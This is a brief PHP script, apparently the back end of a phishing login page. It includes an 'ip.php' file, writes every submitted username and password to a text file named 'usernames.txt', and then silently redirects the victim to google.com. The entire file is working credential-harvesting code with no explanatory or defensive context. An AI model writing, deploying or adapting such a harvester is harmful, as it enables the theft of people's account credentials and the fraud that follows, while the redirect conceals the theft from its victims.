<?php
include 'ip.php';

file_put_contents("usernames.txt", "[USERNAME]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "
", FILE_APPEND);
header('Location: https://www.google.com');
exit();